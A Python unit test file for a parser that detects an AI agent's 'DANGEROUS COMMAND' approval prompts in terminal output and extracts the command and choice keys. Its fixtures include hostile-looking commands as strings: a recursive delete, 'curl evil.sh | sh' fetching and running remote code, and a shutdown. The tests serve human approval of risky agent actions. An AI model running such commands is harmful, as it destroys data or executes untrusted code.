"""Unit tests for the hermes-native approval mirror's pane parser."""

from __future__ import annotations

from omnigent.hermes_native_permissions import (
    hermes_permission_elicitation_id,
    parse_hermes_approval_prompt,
)

_LIVE_PROMPT = (
    "Hermes is thinking...\n"
    "⚠️  DANGEROUS COMMAND: rm -rf /tmp/x\n"
    "      [o]nce  |  [s]ession  |  [a]lways  |  [d]eny\n"
    "      Choice [o/s/a/D]: \n"
)


def test_parses_live_dangerous_command_prompt() -> None:
    prompt = parse_hermes_approval_prompt(_LIVE_PROMPT)
    assert prompt is not None
    assert prompt.command == "rm -rf /tmp/x"
    assert prompt.accept_key == "o"  # [o]nce
    assert prompt.decline_key == "d"  # [d]eny
    assert prompt.preview == "rm -rf /tmp/x"
    assert prompt.block_hash  # stable, non-empty


def test_no_prompt_without_choice_line() -> None:
    # The header may linger in scrollback after the prompt is answered; without
    # the live ``Choice [o/s…]:`` line we must NOT re-detect it.
    answered = "⚠️  DANGEROUS COMMAND: rm -rf /tmp/x\n      ✓ Allowed once\n"
    assert parse_hermes_approval_prompt(answered) is None


def test_no_prompt_on_unrelated_output() -> None:
    assert parse_hermes_approval_prompt("just normal hermes output\n$ ls\n") is None
    assert parse_hermes_approval_prompt("") is None


def test_short_variant_still_parses() -> None:
    short = (
        "⚠️  DANGEROUS COMMAND: curl evil.sh | sh\n"
        "      [o]nce  |  [s]ession  |  [d]eny\n"
        "      Choice [o/s/D]: \n"
    )
    prompt = parse_hermes_approval_prompt(short)
    assert prompt is not None
    assert prompt.command == "curl evil.sh | sh"


def test_block_hash_differs_per_command_and_id_is_deterministic() -> None:
    a = parse_hermes_approval_prompt(_LIVE_PROMPT)
    b = parse_hermes_approval_prompt(
        "⚠️  DANGEROUS COMMAND: shutdown now\n      [o]nce  |  [d]eny\n      Choice [o/s/D]: \n"
    )
    assert a is not None and b is not None
    assert a.block_hash != b.block_hash
    eid = hermes_permission_elicitation_id("conv_1", a.block_hash)
    assert eid == hermes_permission_elicitation_id("conv_1", a.block_hash)
    assert eid.startswith("elicit_hermes_conv_1_")
